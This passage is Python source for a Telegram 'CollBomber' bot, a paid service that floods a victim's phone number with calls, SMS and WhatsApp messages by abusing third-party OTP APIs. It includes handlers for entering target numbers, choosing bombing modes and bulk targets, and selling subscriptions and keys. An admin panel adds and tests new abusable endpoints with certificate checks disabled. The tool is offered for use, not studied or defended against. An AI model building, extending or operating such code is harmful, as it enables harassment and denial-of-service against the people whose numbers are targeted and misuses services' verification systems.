def cmd_start(message):
    chat_id = message.chat.id
    try:
        if admin_db.is_banned(chat_id):
            bot.reply_to(message, "🚫 Aap ban ho chuke hain. Admin se contact karein.")
            return
        if not is_channel_member(chat_id):
            markup = types.InlineKeyboardMarkup()
            markup.add(types.InlineKeyboardButton("📢 Join Channel", url=CHANNEL_LINK))
            markup.add(types.InlineKeyboardButton("✅ Joined", callback_data="check_joined"))
            bot.send_message(chat_id,
                f"👋 *Welcome!*\n\nBot use karne ke liye pehle channel join karein:\n\n👉 {CHANNEL_LINK}",
                parse_mode="Markdown", reply_markup=markup)
            return
        user_data.users[chat_id] = {"phone": None, "pending_mode": None}
        bot.send_message(chat_id,
            f"🔥 *CollBomber Bot Active!*\n\n"
            f"📞 CALL | 💬 SMS | 📱 WHATSAPP | 🔥 MIX | 💥 Bulk MIX\n\n"
            f"📊 Total APIs: *{len(ALL_APIS)}*\n"
            f"📞 Call: {len(CALL_APIS)} | 💬 SMS: {len(SMS_APIS)} | 📱 WA: {len(WHATSAPP_APIS)}\n\n"
            f"Target number bhejein (10 digits):",
            parse_mode="Markdown", reply_markup=main_keyboard(chat_id))
    except Exception as e:
        logger.error(f"cmd_start error: {e}")

@bot.message_handler(commands=['help'])
def cmd_help(message):
    try:
        bot.reply_to(message,
            "❓ *Help*\n\n"
            "1️⃣ Number bhejein (10 digits)\n"
            "2️⃣ Mode select karein\n"
            "3️⃣ Bombing start ho jayegi\n"
            "4️⃣ 🛑 Stop se band karein\n\n"
            f"📊 Total APIs: {len(ALL_APIS)}\n"
            f"📞 Call: {len(CALL_APIS)} | 💬 SMS: {len(SMS_APIS)} | 📱 WA: {len(WHATSAPP_APIS)}\n\n"
            "*Commands:*\n"
            "/start — Restart\n/status — Session status\n/stop — Stop bombing\n"
            "/plans — Subscription plans\n/redeem — Redeem key\n"
            "/account — Your account\n/contact — Contact admin",
            parse_mode="Markdown")
    except Exception as e:
        logger.error(f"cmd_help error: {e}")

@bot.message_handler(commands=['status'])
def cmd_status(message):
    try:
        chat_id = message.chat.id
        st = bomber.get_status(chat_id)
        if not st:
            bot.reply_to(message, "❌ Koi active session nahi hai.")
            return
        pct = (st['ok'] / max(st['total'], 1)) * 100
        bar_len = 30
        filled = int(bar_len * pct / 100)
        bar = "█" * filled + "░" * (bar_len - filled)
        bot.reply_to(message,
            f"📊 *Session Status*\n────────────────────\n"
            f"💣 Target: `{st['phone']}`\n🎯 Mode: {st['mode'].upper()}\n"
            f"✅ Hits: {st['ok']}/{st['total']}\n📊 [{bar}] {pct:.1f}%\n"
            f"⏱️ Elapsed: {st['elapsed']}\n🔄 Rounds: {st['rounds']}",
            parse_mode="Markdown")
    except Exception as e:
        logger.error(f"cmd_status error: {e}")

@bot.message_handler(commands=['stop'])
def cmd_stop(message):
    try:
        ok, msg = bomber.stop(message.chat.id)
        bot.reply_to(message, msg, parse_mode="Markdown")
    except Exception as e:
        logger.error(f"cmd_stop error: {e}")

@bot.message_handler(commands=['plans'])
def cmd_plans(message):
    try:
        markup = types.InlineKeyboardMarkup(row_width=1)
        markup.add(
            types.InlineKeyboardButton("📅 Daily — ₹40", callback_data="plan_daily"),
            types.InlineKeyboardButton("📅 Monthly — ₹199", callback_data="plan_monthly"),
            types.InlineKeyboardButton("📅 3 Months — ₹499", callback_data="plan_3month"),
        )
        bot.reply_to(message, "📋 *Subscription Plans*\n\nSelect a plan:", parse_mode="Markdown", reply_markup=markup)
    except Exception as e:
        logger.error(f"cmd_plans error: {e}")

@bot.message_handler(commands=['redeem'])
def cmd_redeem(message):
    try:
        chat_id = message.chat.id
        user_data.users.setdefault(chat_id, {})["awaiting_key"] = True
        bot.reply_to(message, "🎁 Apni key bhejein:")
    except Exception as e:
        logger.error(f"cmd_redeem error: {e}")

@bot.message_handler(commands=['account'])
def cmd_account(message):
    try:
        chat_id = message.chat.id
        sub = admin_db.get_subscription(chat_id)
        if not sub:
            bot.reply_to(message, "👤 *Account*\n\n❌ No active subscription.", parse_mode="Markdown")
            return
        expires = datetime.fromisoformat(str(sub["expires_at"])) if isinstance(sub["expires_at"], str) else sub["expires_at"]
        days_left = (expires - datetime.now()).days
        bot.reply_to(message,
            f"👤 *Account*\n────────────────────\n"
            f"🎯 Plan: {sub['plan'].upper()}\n📅 Days left: {max(days_left, 0)}\n"
            f"⚡ Concurrent: {sub['max_concurrent']}\n✅ Status: Active",
            parse_mode="Markdown")
    except Exception as e:
        logger.error(f"cmd_account error: {e}")

@bot.message_handler(commands=['contact'])
def cmd_contact(message):
    try:
        chat_id = message.chat.id
        user_data.users.setdefault(chat_id, {})["awaiting_contact"] = True
        bot.reply_to(message, "📩 Apna message likhein admin ke liye:")
    except Exception as e:
        logger.error(f"cmd_contact error: {e}")

@bot.message_handler(commands=['admin'])
def cmd_admin(message):
    try:
        chat_id = message.chat.id
        if chat_id not in ADMIN_IDS and not admin_db.is_admin(chat_id):
            bot.reply_to(message, "❌ Aap admin nahi hain.")
            return
        bot.reply_to(message, "⚙️ *Admin Panel* — Full Controls", parse_mode="Markdown", reply_markup=admin_keyboard())
    except Exception as e:
        logger.error(f"cmd_admin error: {e}")

# ============================================================
# CALLBACK HANDLERS
# ============================================================
@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    chat_id = call.message.chat.id
    data = call.data
    is_admin = chat_id in ADMIN_IDS or admin_db.is_admin(chat_id)

    try:
        if data == "check_joined":
            if is_channel_member(chat_id):
                bot.answer_callback_query(call.id, "✅ Verified!")
                user_data.users[chat_id] = {"phone": None, "pending_mode": None}
                bot.send_message(chat_id, "✅ *Channel joined!*\n\nTarget number bhejein:",
                    parse_mode="Markdown", reply_markup=main_keyboard(chat_id))
            else:
                bot.answer_callback_query(call.id, "❌ Pehle channel join karein!", show_alert=True)
        elif data == "stop_bombing":
            ok, msg = bomber.stop(chat_id)
            bot.answer_callback_query(call.id, "🛑 Stopped!")
            bot.send_message(chat_id, msg, parse_mode="Markdown")
        elif data == "goto_plans":
            cmd_plans(call.message)
        elif data == "goto_redeem":
            user_data.users.setdefault(chat_id, {})["awaiting_key"] = True
            bot.send_message(chat_id, "🎁 Apni key bhejein:")
        elif data.startswith("plan_"):
            plan = data.replace("plan_", "")
            bot.answer_callback_query(call.id, f"Plan: {plan.upper()}")
            bot.send_message(chat_id, f"💳 *{plan.upper()} Plan*\n\nAdmin se contact karein: /contact", parse_mode="Markdown")
        elif data.startswith("mode_"):
            parts = data.split("_", 2)
            if len(parts) >= 3:
                mode = parts[1]
                phone = parts[2]
                ok, msg = bomber.start(chat_id, phone, mode, call.from_user.username)
                bot.answer_callback_query(call.id, "🔥 Started!" if ok else f"❌ {msg[:50]}")

        elif data == "adm_stats" and is_admin:
            bot.send_message(chat_id,
                f"📊 *Bot Statistics*\n────────────────────\n"
                f"👥 Total Users: {admin_db.get_user_count()}\n"
                f"⭐ Premium Users: {admin_db.get_premium_count()}\n"
                f"🚫 Banned: {admin_db.get_banned_count()}\n"
                f"💣 Total Bombs: {admin_db.get_total_bombs()}\n"
                f"────────────────────\n"
                f"📡 APIs Loaded:\n   • Total: {len(ALL_APIS)}\n"
                f"   • Call: {len(CALL_APIS)}\n   • SMS: {len(SMS_APIS)}\n"
                f"   • WhatsApp: {len(WHATSAPP_APIS)}\n"
                f"   • Custom: {custom_api_db.count()}",
                parse_mode="Markdown")

        elif data == "adm_users" and is_admin:
            users = admin_db.get_all_users()
            msg = f"👥 *Total Users: {len(users)}*\n\n"
            for uid, u in list(users.items())[:30]:
                sub = admin_db.get_subscription(uid)
                badge = "⭐" if sub else "  "
                banned = "🚫" if admin_db.is_banned(uid) else "  "
                uname = u.get('username', 'N/A') if isinstance(u, dict) else 'N/A'
                msg += f"{badge}{banned} `{uid}` @{uname}\n"
            if len(users) > 30:
                msg += f"\n... and {len(users) - 30} more"
            bot.send_message(chat_id, msg, parse_mode="Markdown")

        elif data == "adm_premium_list" and is_admin:
            premium = admin_db.get_premium_users()
            active = []
            for uid in premium:
                sub = admin_db.get_subscription(uid)
                if sub:
                    active.append((uid, sub))
            msg = f"⭐ *Premium Users: {len(active)} active*\n\n"
            for uid, sub in active[:30]:
                try:
                    exp = sub["expires_at"]
                    if isinstance(exp, str):
                        exp = datetime.fromisoformat(exp)
                    days_left = (exp - datetime.now()).days
                    msg += f"• `{uid}` — {sub['plan'].upper()} — {max(days_left,0)}d left\n"
                except Exception:
                    msg += f"• `{uid}` — active\n"
            bot.send_message(chat_id, msg, parse_mode="Markdown")

        elif data == "adm_premium_give" and is_admin:
            admin_data[chat_id] = {"awaiting_premium_give": True}
            bot.send_message(chat_id, "💰 *Give Premium*\n\nFormat: `<user_id> <days>`\nExample: `8128821116 30`", parse_mode="Markdown")

        elif data == "adm_premium_remove" and is_admin:
            admin_data[chat_id] = {"awaiting_premium_remove": True}
            bot.send_message(chat_id, "❌ *Remove Premium*\n\nUser ID bhejein:")

        elif data == "adm_ban" and is_admin:
            admin_data[chat_id] = {"awaiting_ban": True}
            bot.send_message(chat_id, "🚫 *Ban User*\n\nUser ID bhejein:")

        elif data == "adm_unban" and is_admin:
            admin_data[chat_id] = {"awaiting_unban": True}
            bot.send_message(chat_id, "✅ *Unban User*\n\nUser ID bhejein:")

        elif data == "adm_banned_list" and is_admin:
            banned = admin_db.get_banned_list()
            msg = f"🚫 *Banned Users: {len(banned)}*\n\n"
            for uid in banned[:50]:
                msg += f"• `{uid}`\n"
            bot.send_message(chat_id, msg if banned else "✅ No banned users.", parse_mode="Markdown")

        elif data == "adm_genkey" and is_admin:
            admin_data[chat_id] = {"awaiting_genkey": True}
            bot.send_message(chat_id, "🔑 *Generate Key*\n\nPlan: `daily` / `monthly` / `3month` / `custom:<days>`\n\nExample: `custom:15`", parse_mode="Markdown")

        elif data == "adm_broadcast" and is_admin:
            admin_data[chat_id] = {"awaiting_broadcast": True}
            bot.send_message(chat_id, "📢 Broadcast message bhejein:")

        elif data == "adm_add_api" and is_admin:
            admin_data[chat_id] = {"awaiting_add_api": True}
            bot.send_message(chat_id,
                "➕ *Add Custom API*\n\nFormat: `name|url|method|category|body`\n\n"
                "Example:\n`MyAPI|https://example.com/otp?phone={phone}|GET|sms|`\n\n"
                "Categories: `call` / `sms` / `whatsapp`",
                parse_mode="Markdown")

        elif data == "adm_list_apis" and is_admin:
            custom = custom_api_db.get_all()
            msg = f"📋 *Custom APIs: {len(custom)}*\n\n"
            for api in custom[:30]:
                msg += f"• `{api['name']}` — {api['method']} — {api['category']}\n"
            msg += f"\n📡 Total built-in: {len(ALL_APIS) - len(custom)}"
            bot.send_message(chat_id, msg, parse_mode="Markdown")

        elif data == "adm_check_api" and is_admin:
            admin_data[chat_id] = {"awaiting_check_api": True}
            bot.send_message(chat_id,
                "🔍 *Check API*\n\nFormat: `<url_with_{phone}>|<10_digit_number>`\n\n"
                "Example:\n`https://example.com/otp?phone={phone}|9876543210`",
                parse_mode="Markdown")

        elif data == "adm_remove_api" and is_admin:
            admin_data[chat_id] = {"awaiting_remove_api": True}
            bot.send_message(chat_id, "🗑️ API name bhejein jo remove karna hai:")

        elif data == "adm_apistats" and is_admin:
            stats = admin_db.get_api_stats()
            sorted_stats = sorted(stats.items(), key=lambda x: x[1]["success"], reverse=True)
            msg = f"📡 *API Stats* ({len(stats)} tracked)\n\n"
            for name, s in sorted_stats[:25]:
                msg += f"• {name}: ✅{s['success']} ❌{s['fail']}\n"
            bot.send_message(chat_id, msg, parse_mode="Markdown")

        elif data == "adm_pending_contacts" and is_admin:
            pending = admin_db.get_pending_contacts()
            if not pending:
                bot.send_message(chat_id, "✅ No pending contact messages.")
                return
            msg = f"📩 *Pending Contacts: {len(pending)}*\n\n"
            for p in pending[:10]:
                msg += f"• ID: `{p['id']}`\n  User: `{p['user_id']}`\n  Msg: {p['message'][:80]}\n\n"
            msg += "\n💬 Reply: `/reply <msg_id> <text>`"
            bot.send_message(chat_id, msg, parse_mode="Markdown")

        elif data == "adm_reply_user" and is_admin:
            admin_data[chat_id] = {"awaiting_reply": True}
            bot.send_message(chat_id, "💬 *Reply to User*\n\nFormat: `<msg_id> <reply_text>`", parse_mode="Markdown")

    except Exception as e:
        logger.error(f"Callback error: {e}")

# ============================================================
# /reply COMMAND
# ============================================================
@bot.message_handler(commands=['reply'])
def cmd_reply(message):
    try:
        chat_id = message.chat.id
        if chat_id not in ADMIN_IDS and not admin_db.is_admin(chat_id):
            return
        parts = message.text.split(" ", 2)
        if len(parts) < 3:
            bot.reply_to(message, "❌ Format: `/reply <msg_id> <text>`", parse_mode="Markdown")
            return
        msg_id = parts[1].strip()
        reply_text = parts[2].strip()
        contact = admin_db.get_contact_message(msg_id)
        if not contact:
            bot.reply_to(message, "❌ Message ID not found.")
            return
        try:
            user_id = int(contact["user_id"])
            bot.send_message(user_id,
                f"📩 *Admin Reply*\n\n💬 {reply_text}\n\n"
                f"────────────────\nOriginal: _{contact['message'][:100]}_",
                parse_mode="Markdown")
            admin_db.mark_replied(msg_id, reply_text)
            bot.reply_to(message, f"✅ Reply sent to `{user_id}`!", parse_mode="Markdown")
        except Exception as e:
            bot.reply_to(message, f"❌ Failed: {str(e)[:100]}")
    except Exception as e:
        logger.error(f"cmd_reply error: {e}")

# ============================================================
# MESSAGE HANDLER
# ============================================================
@bot.message_handler(func=lambda m: True)
def message_handler(message):
    try:
        chat_id = message.chat.id
        text = (message.text or "").strip()
        is_admin = chat_id in ADMIN_IDS or admin_db.is_admin(chat_id)

        if admin_db.is_banned(chat_id):
            bot.reply_to(message, "🚫 Aap ban ho chuke hain.")
            return

        if not is_channel_member(chat_id) and not is_admin:
            markup = types.InlineKeyboardMarkup()
            markup.add(types.InlineKeyboardButton("📢 Join Channel", url=CHANNEL_LINK))
            markup.add(types.InlineKeyboardButton("✅ Joined", callback_data="check_joined"))
            bot.reply_to(message, f"⚠️ Pehle channel join karein:\n{CHANNEL_LINK}", reply_markup=markup)
            return

        user_data.users.setdefault(chat_id, {})

        # Admin flows
        if is_admin:
            ad = admin_data.get(chat_id, {})

            if ad.get("awaiting_genkey"):
                plan = text.lower().strip()
                custom_days = None
                if plan.startswith("custom:"):
                    try:
                        custom_days = int(plan.split(":")[1])
                        plan = "custom"
                    except Exception:
                        bot.reply_to(message, "❌ Format: custom:30")
                        return
                key = admin_db.generate_key(plan, chat_id, custom_days)
                admin_data.pop(chat_id, None)
                bot.reply_to(message, f"✅ Key generated:\n\n`{key}`", parse_mode="Markdown")
                return

            if ad.get("awaiting_broadcast"):
                admin_data.pop(chat_id, None)
                users = admin_db.get_all_users()
                sent = 0
                for uid in users:
                    try:
                        bot.send_message(int(uid), f"📢 *Admin Broadcast*\n\n{text}", parse_mode="Markdown")
                        sent += 1
                        time.sleep(0.05)
                    except Exception:
                        pass
                bot.reply_to(message, f"✅ Broadcast sent to {sent} users.")
                return

            if ad.get("awaiting_premium_give"):
                admin_data.pop(chat_id, None)
                parts = text.split()
                if len(parts) < 2 or not parts[0].isdigit() or not parts[1].isdigit():
                    bot.reply_to(message, "❌ Format: `<user_id> <days>`", parse_mode="Markdown")
                    return
                uid = int(parts[0])
                days = int(parts[1])
                admin_db.give_premium(uid, days)
                bot.reply_to(message, f"✅ Premium given to `{uid}` for {days} days!", parse_mode="Markdown")
                try:
                    bot.send_message(uid, f"⭐ *Premium Activated!*\n\nAdmin ne aapko {days} days premium diya hai!", parse_mode="Markdown")
                except Exception:
                    pass
                return

            if ad.get("awaiting_premium_remove"):
                admin_data.pop(chat_id, None)
                if not text.isdigit():
                    bot.reply_to(message, "❌ Valid user ID bhejein.")
                    return
                uid = int(text)
                removed = admin_db.remove_premium(uid)
                bot.reply_to(message, f"{'✅' if removed else '❌'} Premium {'removed' if removed else 'not found'} for `{uid}`", parse_mode="Markdown")
                return

            if ad.get("awaiting_ban"):
                admin_data.pop(chat_id, None)
                if not text.isdigit():
                    bot.reply_to(message, "❌ Valid user ID bhejein.")
                    return
                uid = int(text)
                ok = admin_db.ban_user(uid, chat_id)
                bot.reply_to(message, f"{'✅ Banned' if ok else '❌ Already banned'}: `{uid}`", parse_mode="Markdown")
                return

            if ad.get("awaiting_unban"):
                admin_data.pop(chat_id, None)
                if not text.isdigit():
                    bot.reply_to(message, "❌ Valid user ID bhejein.")
                    return
                uid = int(text)
                ok = admin_db.unban_user(uid, chat_id)
                bot.reply_to(message, f"{'✅ Unbanned' if ok else '❌ Not banned'}: `{uid}`", parse_mode="Markdown")
                return

            if ad.get("awaiting_add_api"):
                admin_data.pop(chat_id, None)
                try:
                    parts = text.split("|")
                    if len(parts) < 4:
                        bot.reply_to(message, "❌ Format: `name|url|method|category|body`", parse_mode="Markdown")
                        return
                    name = parts[0].strip()
                    url = parts[1].strip()
                    method = parts[2].strip().upper()
                    category = parts[3].strip().lower()
                    body = parts[4].strip() if len(parts) > 4 and parts[4].strip() else None
                    if category not in ["call", "sms", "whatsapp"]:
                        bot.reply_to(message, "❌ Category must be: call / sms / whatsapp")
                        return
                    custom_api_db.add_api(name, url, method, {}, body, category)
                    reload_apis()
                    bot.reply_to(message, f"✅ API added: `{name}`\n\n📊 Total APIs: {len(ALL_APIS)}", parse_mode="Markdown")
                except Exception as e:
                    bot.reply_to(message, f"❌ Error: {str(e)[:100]}")
                return

            if ad.get("awaiting_check_api"):
                admin_data.pop(chat_id, None)
                try:
                    if "|" not in text:
                        bot.reply_to(message, "❌ Format: `<url>|<10_digit_number>`", parse_mode="Markdown")
                        return
                    url, phone = text.rsplit("|", 1)
                    url = url.strip().replace("{phone}", phone.strip())
                    phone = phone.strip()
                    bot.reply_to(message, f"🔍 Testing...\n\n`{url[:80]}`", parse_mode="Markdown")
                    resp = requests.get(url, timeout=10, verify=False, headers={"User-Agent": "Mozilla/5.0"})
                    result = (f"✅ *API Test Result*\n──────────────\n"
                             f"Status: {resp.status_code}\nSize: {len(resp.content)} bytes\n"
                             f"Success: {'✅ YES' if 200 <= resp.status_code < 400 else '❌ NO'}\n\n"
                             f"Response:\n`{resp.text[:200]}`")
                    bot.reply_to(message, result, parse_mode="Markdown")
                except Exception as e:
                    bot.reply_to(message, f"❌ Error: {str(e)[:150]}")
                return

            if ad.get("awaiting_remove_api"):
                admin_data.pop(chat_id, None)
                ok = custom_api_db.remove_api(text.strip())
                if ok:
                    reload_apis()
                    bot.reply_to(message, f"✅ API removed: `{text}`", parse_mode="Markdown")
                else:
                    bot.reply_to(message, f"❌ API not found: `{text}`", parse_mode="Markdown")
                return

            if ad.get("awaiting_reply"):
                admin_data.pop(chat_id, None)
                parts = text.split(" ", 1)
                if len(parts) < 2:
                    bot.reply_to(message, "❌ Format: `<msg_id> <text>`", parse_mode="Markdown")
                    return
                msg_id, reply_text = parts[0].strip(), parts[1].strip()
                contact = admin_db.get_contact_message(msg_id)
                if not contact:
                    bot.reply_to(message, "❌ Message ID not found.")
                    return
                try:
                    user_id = int(contact["user_id"])
                    bot.send_message(user_id,
                        f"📩 *Admin Reply*\n\n💬 {reply_text}\n\n────────────────\nOriginal: _{contact['message'][:100]}_",
                        parse_mode="Markdown")
                    admin_db.mark_replied(msg_id, reply_text)
                    bot.reply_to(message, f"✅ Reply sent to `{user_id}`!", parse_mode="Markdown")
                except Exception as e:
                    bot.reply_to(message, f"❌ Failed: {str(e)[:100]}")
                return

        # Contact
        if user_data.users[chat_id].get("awaiting_contact"):
            user_data.users[chat_id].pop("awaiting_contact", None)
            msg_id = admin_db.add_contact_message(chat_id, message.from_user.username, text)
            for admin_id in ADMIN_IDS:
                try:
                    markup = types.InlineKeyboardMarkup()
                    markup.add(types.InlineKeyboardButton("💬 Reply", callback_data="adm_reply_user"))
                    bot.send_message(admin_id,
                        f"📩 *New Contact Message*\n────────────────\n"
                        f"🆔 ID: `{msg_id}`\n"
                        f"👤 User: `{chat_id}` (@{message.from_user.username or 'N/A'})\n"
                        f"💬 Message: {text}\n\n"
                        f"Reply: `/reply {msg_id} <text>`",
                        parse_mode="Markdown", reply_markup=markup)
                except Exception as e:
                    logger.error(f"Admin notify error: {e}")
            bot.reply_to(message, f"✅ Message sent!\nYour Msg ID: `{msg_id}`", parse_mode="Markdown")
            return

        # Redeem
        if user_data.users[chat_id].get("awaiting_key"):
            user_data.users[chat_id].pop("awaiting_key", None)
            ok, msg = admin_db.redeem_key(text.upper(), chat_id)
            bot.reply_to(message, msg, parse_mode="Markdown")
            return

        # Menu
        menu_map = {
            "🔥 MIX": "mix", "💥 Bulk MIX": "bulk_mix",
            "📞 CALL": "call", "📱 WHATSAPP": "whatsapp", "💬 SMS": "sms"
        }
        if text in menu_map:
            user_data.users[chat_id]["pending_mode"] = menu_map[text]
            bot.reply_to(message, f"🎯 {text} mode. Number bhejein (10 digits):")
            return
        if text == "📊 Status": cmd_status(message); return
        if text == "👤 Account": cmd_account(message); return
        if text == "❓ Help": cmd_help(message); return
        if text == "📋 Plans": cmd_plans(message); return
        if text == "🎁 Redeem":
            user_data.users[chat_id]["awaiting_key"] = True
            bot.reply_to(message, "🎁 Apni key bhejein:"); return
        if text == "📩 Contact Admin":
            user_data.users[chat_id]["awaiting_contact"] = True
            bot.reply_to(message, "📩 Message likhein admin ke liye:"); return
        if text == "🛑 Stop": cmd_stop(message); return
        if text == "⚙️ Admin Panel": cmd_admin(message); return

        # Number
        phone_match = re.match(r"^(\+?91)?(\d{10})$", text.replace(" ", "").replace("-", ""))
        if phone_match:
            phone = phone_match.group(2)
            pending_mode = user_data.users[chat_id].get("pending_mode")
            if not pending_mode:
                user_data.users[chat_id]["phone"] = phone
                markup = types.InlineKeyboardMarkup(row_width=2)
                markup.add(
                    types.InlineKeyboardButton("📞 CALL", callback_data=f"mode_call_{phone}"),
                    types.InlineKeyboardButton("💬 SMS", callback_data=f"mode_sms_{phone}"),
                    types.InlineKeyboardButton("📱 WHATSAPP", callback_data=f"mode_whatsapp_{phone}"),
                    types.InlineKeyboardButton("🔥 MIX", callback_data=f"mode_mix_{phone}"),
                )
                bot.reply_to(message, f"📱 Number: `{phone}`\n\nMode select karein:",
                    parse_mode="Markdown", reply_markup=markup)
                return
            ok, msg = bomber.start(chat_id, phone, pending_mode, message.from_user.username)
            user_data.users[chat_id]["pending_mode"] = None
            if not ok:
                bot.reply_to(message, msg, parse_mode="Markdown")
            return

        if user_data.users[chat_id].get("pending_mode") == "bulk_mix":
            nums = re.findall(r"\d{10}", text)
            if not nums:
                bot.reply_to(message, "❌ Valid numbers nahi mile.")
                return
            user_data.users[chat_id]["pending_mode"] = None
            ok, msg = bomber.start(chat_id, nums[0], "mix", message.from_user.username)
            if not ok:
                bot.reply_to(message, msg, parse_mode="Markdown")
            else:
                bot.reply_to(message,
                    f"🔁 Bulk MIX: {len(nums)} numbers mile.\n"
                    f"⚠️ Ek time pe sirf 1 number chal sakta hai.\n"
                    f"Pehla: {nums[0]} start ho gaya. Stop karke agla bhejein.",
                    parse_mode="Markdown")
            return

        bot.reply_to(message, "❓ Samajh nahi aaya. /help dekhein.")
    except Exception as e:
        logger.error(f"message_handler error: {e}")

# ============================================================
# MAIN — AUTO-RESTART LOOP
# ============================================================
if __name__ == "__main__":
    logger.info(f"📊 Total APIs: {len(ALL_APIS)}")
    logger.info(f"📞 Call: {len(CALL_APIS)} | 💬 SMS: {len(SMS_APIS)} | 📱 WA: {len(WHATSAPP_APIS)}")
    logger.info(f"⚡ Workers: {MAX_WORKERS} (SMS: {SMS_MAX_WORKERS})")
    logger.info(f"👑 Admins: {ADMIN_IDS}")
    logger.info(f"📢 Channel: {REQUIRED_CHANNEL}")
    logger.info(f"🔒 Channel check: {CHANNEL_CHECK_ENABLED}")
    logger.info(f"🗄️ Database: {'PostgreSQL' if admin_db.use_pg else 'JSON fallback'}")
    logger.info("✅ Bot running with AUTO-RESTART loop!")

    while True:
        try:
            bot.infinity_polling(timeout=60, long_polling_timeout=60, none_stop=True)
        except KeyboardInterrupt:
            logger.info("Stopping...")
            bomber.stop_all()
            break
        except Exception as e:
            logger.error(f"Polling crashed: {e}")
            logger.info("🔄 Restarting in 5 seconds...")
            time.sleep(5)